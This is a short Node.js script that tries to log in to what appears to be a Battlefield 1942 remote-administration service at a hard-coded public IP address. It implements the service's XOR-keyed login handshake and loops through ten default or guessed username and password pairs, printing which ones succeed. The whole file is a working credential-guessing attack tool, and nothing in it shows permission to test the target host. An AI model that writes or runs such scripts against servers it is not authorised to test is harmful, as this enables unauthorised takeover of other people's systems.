const net = require('net');
const xor = (d, k) => {
  const o = Buffer.allocUnsafe(d.length);
  for (let i = 0; i < d.length; i++) o[i] = d[i] ^ k[i % k.length];
  return o;
};

const HOST = '165.245.175.206';
const PORT = 4711;

function tryAuth(user, pass) {
  return new Promise(resolve => {
    let buf = Buffer.alloc(0);
    let authSent = false;
    const sock = new net.Socket();
    sock.setTimeout(3000);
    sock.connect(PORT, HOST);
    sock.on('timeout', () => { console.log('  user=[' + user + '] pass=[' + pass + '] -> TIMEOUT'); sock.destroy(); resolve(); });
    sock.on('data', chunk => {
      buf = Buffer.concat([buf, chunk]);
      if (!authSent && buf.length >= 10) {
        const key = buf.subarray(0, 10);
        const u = Buffer.from(user, 'latin1');
        const p = Buffer.from(pass, 'latin1');
        const lu = Buffer.allocUnsafe(4); lu.writeUInt32LE(u.length, 0);
        const lp = Buffer.allocUnsafe(4); lp.writeUInt32LE(p.length, 0);
        sock.write(Buffer.concat([lu, xor(u, key), lp, xor(p, key)]));
        authSent = true;
        buf = buf.subarray(10);
      } else if (authSent && buf.length >= 1) {
        const b = buf[0];
        console.log('  user=[' + user + '] pass=[' + pass + '] -> ' + (b === 1 ? '*** SUCCESS ***' : 'FAILED (byte=' + b + ')'));
        sock.destroy();
        setTimeout(resolve, 800);
      }
    });
    sock.on('error', e => { console.log('  user=[' + user + '] pass=[' + pass + '] -> ERROR: ' + e.message); setTimeout(resolve, 800); });
  });
}

(async () => {
  const combos = [
    ['derpadmin', 'derppassword'],
    ['admin', 'admin'],
    ['', ''],
    ['UserName', 'Password'],
    ['admin', ''],
    ['', 'derppassword'],
    ['bf1942', 'bf1942'],
    ['Admin', 'Admin'],
    ['administrator', 'administrator'],
    ['rcon', 'rcon'],
  ];
  console.log('Testing ' + combos.length + ' credential combinations against ' + HOST + ':' + PORT);
  for (const [u, p] of combos) await tryAuth(u, p);
  console.log('Done.');
})();
